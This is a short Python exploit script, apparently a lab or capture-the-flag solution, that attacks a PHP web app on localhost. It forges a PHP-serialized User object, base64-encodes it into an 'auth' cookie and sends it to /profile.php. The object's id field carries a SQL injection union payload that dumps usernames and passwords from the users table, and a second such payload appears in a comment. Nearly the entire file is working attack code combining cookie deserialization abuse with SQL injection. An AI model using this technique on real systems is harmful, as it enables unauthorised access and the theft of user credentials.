import httpx
import asyncio
import base64
import urllib.parse

URL = 'http://localhost:8000'

class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def login(self, username, password):
		return self.c.post('/authenticate.php',data={'username': username, 'password': password})

	def cookieProfile(self,cookie):
		return self.c.get('/profile.php',cookies=cookie)

class User:
    def __init__(self):
        self.username = "guest"
        self.password = "5f4dcc3b5aa765d61d8327deb882cf99"
        self.id = "' union select username,password,3,email from users;-- "
        # ' union select group_concat(username),group_concat(password),3,4 from users; --
        self.profile = "nothing"

    def serialize(self):
        # Mimic PHP serialization format for each field
        serialized_str = 'O:4:"User":4:{'
        serialized_str += 's:8:"username";s:{}:"{}";'.format(len(self.username), self.username)
        serialized_str += 's:8:"password";s:{}:"{}";'.format(len(self.password), self.password)
        serialized_str += 's:2:"id";s:{}:"{}";'.format(len(self.id), self.id)
        serialized_str += 's:7:"profile";s:{}:"{}";'.format(len(self.profile), self.profile)
        serialized_str += '}'
        return serialized_str

class API(BaseAPI):
	...

def setCookies():
	user = User()
	cookies = user.serialize()
	encoded_cookies = base64.b64encode(cookies.encode()).decode()
	return encoded_cookies

async def main():
	api = API()
	cookies = {'auth': setCookies()}
	profile = await api.cookieProfile(cookies)
	print(profile.text)


if __name__ == '__main__':
	asyncio.run(main())